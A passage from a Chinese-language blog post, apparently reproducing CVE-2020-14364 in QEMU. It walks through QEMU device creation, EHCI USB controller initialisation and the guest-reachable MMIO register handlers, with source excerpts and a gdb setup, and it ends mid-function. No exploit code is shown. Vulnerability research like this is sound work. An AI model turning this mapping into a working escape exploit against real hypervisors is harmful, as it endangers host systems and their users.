&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 根据driver名称获取到对应的DriverClass对象（由ObjectClass转换得到）</span></span><br><span class="line">  <span class="comment">// 函数实际上是调用object_class_by_name函数通过全局HASH表获取到对应的TypeInfo</span></span><br><span class="line">  <span class="comment">// 接着调用type_initialize初始化对应的type，这过程中会初始化ObjectClass，返回该Class</span></span><br><span class="line">    <span class="comment">/* find driver */</span></span><br><span class="line">    dc = qdev_get_device_class(&amp;driver, errp);</span><br><span class="line">    <span class="keyword">if</span> (!dc) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find bus */</span></span><br><span class="line">    path = qemu_opt_get(opts, <span class="string">&quot;bus&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        bus = qbus_find(path, errp);</span><br><span class="line">        <span class="keyword">if</span> (!bus) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!object_dynamic_cast(OBJECT(bus), dc-&gt;bus_type)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;Device &#x27;%s&#x27; can&#x27;t go on %s bus&quot;</span>,</span><br><span class="line">                       driver, object_get_typename(OBJECT(bus)));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dc-&gt;bus_type != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        bus = qbus_find_recursive(sysbus_get_default(), <span class="literal">NULL</span>, dc-&gt;bus_type);</span><br><span class="line">        <span class="keyword">if</span> (!bus || qbus_is_full(bus)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;No &#x27;%s&#x27; bus found for device &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">                       dc-&gt;bus_type, driver);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hide = should_hide_device(opts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((hide || qdev_hotplug) &amp;&amp; bus &amp;&amp; !qbus_is_hotpluggable(bus)) &#123;</span><br><span class="line">        error_setg(errp, QERR_BUS_NO_HOTPLUG, bus-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hide) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!migration_is_idle()) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;device_add not allowed while migrating&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create device */</span></span><br><span class="line">  <span class="comment">// DEVICE将Object结构体转换为DevciceState结构体</span></span><br><span class="line">    dev = DEVICE(object_new(driver));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check whether the hotplug is allowed by the machine */</span></span><br><span class="line">    <span class="keyword">if</span> (qdev_hotplug &amp;&amp; !qdev_hotplug_allowed(dev, &amp;err)) &#123;</span><br><span class="line">        <span class="comment">/* Error must be set in the machine hook */</span></span><br><span class="line">        assert(err);</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bus) &#123;</span><br><span class="line">        qdev_set_parent_bus(dev, bus);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qdev_hotplug &amp;&amp; !qdev_get_machine_hotplug_handler(dev)) &#123;</span><br><span class="line">        <span class="comment">/* No bus, no machine hotplug handler --&gt; device is not hotpluggable */</span></span><br><span class="line">        error_setg(&amp;err, <span class="string">&quot;Device &#x27;%s&#x27; can not be hotplugged on this machine&quot;</span>,</span><br><span class="line">                   driver);</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qdev_set_id(dev, qemu_opts_id(opts));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set properties */</span></span><br><span class="line">    <span class="keyword">if</span> (qemu_opt_foreach(opts, set_property, dev, &amp;err)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dev-&gt;opts = opts;</span><br><span class="line">    object_property_set_bool(OBJECT(dev), <span class="literal">true</span>, <span class="string">&quot;realized&quot;</span>, &amp;err);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        dev-&gt;opts = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dev;</span><br><span class="line"></span><br><span class="line">err_del_dev:</span><br><span class="line">    error_propagate(errp, err);</span><br><span class="line">    <span class="keyword">if</span> (dev) &#123;</span><br><span class="line">        object_unparent(OBJECT(dev));</span><br><span class="line">        object_unref(OBJECT(dev));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中可以看出，主要的流程就是首先获取<code>driver</code>的<code>name</code>，接着看参数中是否指定了<code>bus</code>否则就按照<code>Class</code>中指定的<code>bus</code>，接着调用<code>object_new</code>初始化对象，也就是初始化<code>device</code>的描述符<code>DeviceState</code>结构体，将其添加到<code>bus</code>之后为初始化之后的对象添加相应的属性，<code>device</code>即添加完成。看一下<code>object_new</code>的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//qom/object.c</span></span><br><span class="line">Object *<span class="title function_">object_new</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *typename)</span></span><br><span class="line">&#123;</span><br><span class="line">    TypeImpl *ti = type_get_by_name(typename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object_new_with_type(ti);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> Object *<span class="title function_">object_new_with_type</span><span class="params">(Type type)</span></span><br><span class="line">&#123;</span><br><span class="line">    Object *obj;</span><br><span class="line"></span><br><span class="line">    g_assert(type != <span class="literal">NULL</span>);</span><br><span class="line">    type_initialize(type);</span><br><span class="line"></span><br><span class="line">    obj = g_malloc(type-&gt;instance_size);</span><br><span class="line">    object_initialize_with_type(obj, type-&gt;instance_size, type);</span><br><span class="line">    obj-&gt;<span class="built_in">free</span> = g_free;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_initialize_with_type</span><span class="params">(<span class="type">void</span> *data, <span class="type">size_t</span> size, TypeImpl *type)</span></span><br><span class="line">&#123;</span><br><span class="line">    Object *obj = data;</span><br><span class="line"></span><br><span class="line">    type_initialize(type);</span><br><span class="line"></span><br><span class="line">    g_assert(type-&gt;instance_size &gt;= <span class="keyword">sizeof</span>(Object));</span><br><span class="line">    g_assert(type-&gt;abstract == <span class="literal">false</span>);</span><br><span class="line">    g_assert(size &gt;= type-&gt;instance_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(obj, <span class="number">0</span>, type-&gt;instance_size);</span><br><span class="line">    obj-&gt;<span class="class"><span class="keyword">class</span> =</span> type-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    object_ref(obj);</span><br><span class="line">    obj-&gt;properties = g_hash_table_new_full(g_str_hash, g_str_equal,</span><br><span class="line">                                            <span class="literal">NULL</span>, object_property_free);</span><br><span class="line">    object_init_with_type(obj, type);</span><br><span class="line">    object_post_init_with_type(obj, type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">object_init_with_type</span><span class="params">(Object *obj, TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (type_has_parent(ti)) &#123;</span><br><span class="line">        object_init_with_type(obj, type_get_parent(ti));<span class="comment">// 递归初始化父Object</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;instance_init) &#123;<span class="comment">// 调用对应的初始化函数</span></span><br><span class="line">        ti-&gt;instance_init(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码逻辑中我们可以看到，函数首先从全局<code>Hash</code>表中得到<code>TypeImpl</code>结构体，然后在函数<code>object_new_with_type</code>中根据<code>type-&gt;instance_size</code>分配堆块的大小，该大小就是<code>DeciceState</code>结构体的大小。堆块分配完毕之后在<code>object_initialize_with_type--&gt;object_init_with_type</code>函数递归的初始化父<code>Object</code>，并调用对应的初始化函数。至此一个<code>device</code>的实例创建完成。</p><h2 id="usb设备读写函数"><a href="#usb设备读写函数" class="headerlink" title="usb设备读写函数"></a>usb设备读写函数</h2><p>首先我们看一下所有的设备，可以发现有两个是<code>usb control</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00:01.2 USB controller: Intel Corporation 82371SB PIIX3 USB [Natoma/Triton II] (rev 01) (prog-if 0)</span><br><span class="line">        Subsystem: Red Hat, Inc QEMU Virtual Machine</span><br><span class="line">        Flags: bus master, fast devsel, latency 0, IRQ 11</span><br><span class="line">        I/O ports at c040 [size=32]</span><br><span class="line">        Kernel driver <span class="keyword">in</span> use: uhci_hcd</span><br><span class="line">00:04.0 USB controller: Intel Corporation 82801I (ICH9 Family) USB2 EHCI Controller <span class="comment">#1 (rev 03) (p)</span></span><br><span class="line">        Subsystem: Red Hat, Inc QEMU Virtual Machine</span><br><span class="line">        Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">        Memory at febb1000 (32-bit, non-prefetchable) [size=4K]</span><br><span class="line">        Kernel driver <span class="keyword">in</span> use: ehci-pci</span><br></pre></td></tr></table></figure><p>从启动脚本中对于<code>usb</code>设备的挂在来看<code>(ehci)</code>，这里<code>00:04.0</code>是我们创建的<code>usb</code>设备。这里首先看一下<a href="https://qkxu.github.io/2020/01/05/USB%E8%AE%BE%E5%A4%87%E7%9B%B4%E9%80%9A.html"><code>usb</code>的控制器类型</a></p><ul><li>OHCI（Open Host Controller Interface）是支持USB1.1的标准，但它不仅仅是针对USB，还支持其他的一些接口，比如它还支持Apple的火线（Firewire，IEEE 1394）接口。与UHCI相比，OHCI的硬件复杂，硬件做的事情更多，所以实现对应的软件驱动的任务，就相对较简单。主要用于非x86的USB，如扩展卡、嵌入式开发板的USB主控。</li><li>UHCI（Universal Host Controller Interface），是Intel主导的对USB1.0、1.1的接口标准，与OHCI不兼容。UHCI的软件驱动的任务重，需要做得比较复杂，但可以使用较便宜、较简单的硬件的USB控制器。Intel和VIA使用UHCI，而其余的硬件提供商使用OHCI。</li><li>EHCI（Enhanced Host Controller Interface），是Intel主导的USB2.0的接口标准。EHCI仅提供USB2.0的高速功能，而依靠UHCI或OHCI来提供对全速（full-speed）或低速（low-speed）设备的支持。</li><li>xHCI（eXtensible Host Controller Interface），是最新最火的USB3.0的接口标准，它在速度、节能、虚拟化等方面都比前面3中有了较大的提高。xHCI支持所有种类速度的USB设备（USB 3.0 SuperSpeed, USB 2.0 Low-, Full-, and High-speed, USB 1.1 Low- and Full-speed）。xHCI的目的是为了替换前面3中（UHCI/OHCI/EHCI）。</li></ul><p>这里启动脚本中选择的是<code>EHCI</code>，因此这里的初始化函数为<code>usb_ehci_pci_init</code>（这里的函数通过直接搜索<code>usb</code>函数得到）。同时这里我们对该函数下断点<code>gdb qemu-system-x86_64</code>，其中<code>gdb_dbg</code>如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file qemu-system-x86_64 0x555555554000</span><br><span class="line"><span class="built_in">set</span> args -m 1G -nographic -hda ./rootfs.img -kernel ./bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda</span></span><br><span class="line"><span class="string"> rw&quot;</span> -device e1000,netdev=net0 -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::2222-:22 -usb -drive <span class="keyword">if</span>=none,form</span><br><span class="line">at=raw,<span class="built_in">id</span>=disk1,file=./usb.img -device ich9-usb-ehci1,<span class="built_in">id</span>=usb -device usb-storage,drive=disk1</span><br><span class="line">b usb_ehci_pci_init</span><br></pre></td></tr></table></figure><p>此时的系统调用栈如下</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210303100505159.png" alt="图片无法显示，请联系作者" title=" "><p>这里我们可以看到<code>object_new</code>函数中初始化了我们指定的<code>usb bus：ich9-usb-ehci1</code>。此时也可以得到<code>usb-ehci</code>的初始化函数为<code>usb_ehci_pci_init</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hw/usb/hcd-ehci-pci.c</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">usb_ehci_pci_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = OBJECT_GET_CLASS(DeviceClass, obj, TYPE_DEVICE);</span><br><span class="line">    EHCIPCIState *i = PCI_EHCI(obj);</span><br><span class="line">    EHCIState *s = &amp;i-&gt;ehci;</span><br><span class="line"></span><br><span class="line">    s-&gt;caps[<span class="number">0x09</span>] = <span class="number">0x68</span>;        <span class="comment">/* EECP */</span></span><br><span class="line"></span><br><span class="line">    s-&gt;capsbase = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;opregbase = <span class="number">0x20</span>;</span><br><span class="line">    s-&gt;portscbase = <span class="number">0x44</span>;</span><br><span class="line">    s-&gt;portnr = NB_PORTS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dc-&gt;hotpluggable) &#123;</span><br><span class="line">        s-&gt;companion_enable = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_ehci_init(s, DEVICE(obj));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到这里将<code>opreg</code>的基地址<code>opregbase</code>设置为<code>0x20</code>，对这块内存读写即对<code>oprg</code>的内容进行读写。<code>opreg</code>的内容如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> opreg[<span class="number">0x44</span>/<span class="keyword">sizeof</span>(<span class="type">uint32_t</span>)];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> usbcmd;</span><br><span class="line">    <span class="type">uint32_t</span> usbsts;</span><br><span class="line">    <span class="type">uint32_t</span> usbintr;</span><br><span class="line">    <span class="type">uint32_t</span> frindex;</span><br><span class="line">    <span class="type">uint32_t</span> ctrldssegment;</span><br><span class="line">    <span class="type">uint32_t</span> periodiclistbase;</span><br><span class="line">    <span class="type">uint32_t</span> asynclistaddr;</span><br><span class="line">    <span class="type">uint32_t</span> notused[<span class="number">9</span>];</span><br><span class="line">    <span class="type">uint32_t</span> configflag;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实际上操作内存的函数总共有三种<code>ehci_caps_read/write, echi_opreg_read/write, echi_port_read/write</code>三种，这三个函数访问的是同一个内存，但是访问的基地址和范围是不一样的。<code>caps</code>的基地址定义在<code>capsbase</code>，对应的<code>port</code>的基地址则定义在<code>portscbase</code>。</p><p>函数设置完相应的成员变量之后就会调用<code>usb_echi_init</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">usb_ehci_init</span><span class="params">(EHCIState *s, DeviceState *dev)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 2.2 host controller interface version */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x00</span>] = (<span class="type">uint8_t</span>)(s-&gt;opregbase - s-&gt;capsbase);</span><br><span class="line">    s-&gt;caps[<span class="number">0x01</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x02</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x03</span>] = <span class="number">0x01</span>;        <span class="comment">/* HC version */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x04</span>] = s-&gt;portnr;   <span class="comment">/* Number of downstream ports */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x05</span>] = <span class="number">0x00</span>;        <span class="comment">/* No companion ports at present */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x06</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x07</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x08</span>] = <span class="number">0x80</span>;        <span class="comment">/* We can cache whole frame, no 64-bit */</span></span><br><span class="line">    s-&gt;caps[<span class="number">0x0a</span>] = <span class="number">0x00</span>;</span><br><span class="line">    s-&gt;caps[<span class="number">0x0b</span>] = <span class="number">0x00</span>;</span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;aqueues);</span><br><span class="line">    QTAILQ_INIT(&amp;s-&gt;pqueues);</span><br><span class="line">    usb_packet_init(&amp;s-&gt;ipacket);</span><br><span class="line"></span><br><span class="line">    memory_region_init(&amp;s-&gt;mem, OBJECT(dev), <span class="string">&quot;ehci&quot;</span>, MMIO_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_caps, OBJECT(dev), &amp;ehci_mmio_caps_ops, s,</span><br><span class="line">                          <span class="string">&quot;capabilities&quot;</span>, CAPA_SIZE);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_opreg, OBJECT(dev), &amp;ehci_mmio_opreg_ops, s,</span><br><span class="line">                          <span class="string">&quot;operational&quot;</span>, s-&gt;portscbase);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;mem_ports, OBJECT(dev), &amp;ehci_mmio_port_ops, s,</span><br><span class="line">                          <span class="string">&quot;ports&quot;</span>, <span class="number">4</span> * s-&gt;portnr);</span><br><span class="line"></span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;capsbase, &amp;s-&gt;mem_caps);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase, &amp;s-&gt;mem_opreg);</span><br><span class="line">    memory_region_add_subregion(&amp;s-&gt;mem, s-&gt;opregbase + s-&gt;portscbase,</span><br><span class="line">                                &amp;s-&gt;mem_ports);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数设置完相应的成员变量之后就注册了<code>caps,opreg,port</code>的读写函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps ehci_mmio_caps_ops = &#123;</span><br><span class="line">    .read = ehci_caps_read,</span><br><span class="line">    .write = ehci_caps_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">1</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .impl.min_access_size = <span class="number">1</span>,</span><br><span class="line">    .impl.max_access_size = <span class="number">1</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps ehci_mmio_opreg_ops = &#123;</span><br><span class="line">    .read = ehci_opreg_read,</span><br><span class="line">    .write = ehci_opreg_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps ehci_mmio_port_ops = &#123;</span><br><span class="line">    .read = ehci_port_read,</span><br><span class="line">    .write = ehci_port_write,</span><br><span class="line">    .valid.min_access_size = <span class="number">4</span>,</span><br><span class="line">    .valid.max_access_size = <span class="number">4</span>,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我们看一下<code>opreg</code>的读写函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">ehci_opreg_read</span><span class="params">(<span class="type">void</span> *ptr, hwaddr addr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="type">uint32_t</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> FRINDEX:</span><br><span class="line">        <span class="comment">/* Round down to mult of 8, else it can go backwards on migration */</span></span><br><span class="line">        val = s-&gt;frindex &amp; ~<span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        val = s-&gt;opreg[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_read(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里传入的是三个参数，第一个参数是<code>EHCIState</code>结构体指针，第二个参数是<code>addr</code>即偏移，当执行语句<code>\*((uint64_t\*)(mmio_mem + 0x20))</code>的时候这里实际上传入的<code>addr</code>是<code>0</code>，因为之前设置的<code>opregbase=0x20</code>。第三个参数就是<code>size</code>，不过这里并没有使用到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_opreg_write</span><span class="params">(<span class="type">void</span> *ptr, hwaddr addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIState *s = ptr;</span><br><span class="line">    <span class="type">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="type">uint32_t</span> old = *mmio;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> USBCMD:</span><br><span class="line">        <span class="keyword">if</span> (val &amp; USBCMD_HCRESET) &#123;</span><br><span class="line">            ehci_reset(s);</span><br><span class="line">            val = s-&gt;usbcmd;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        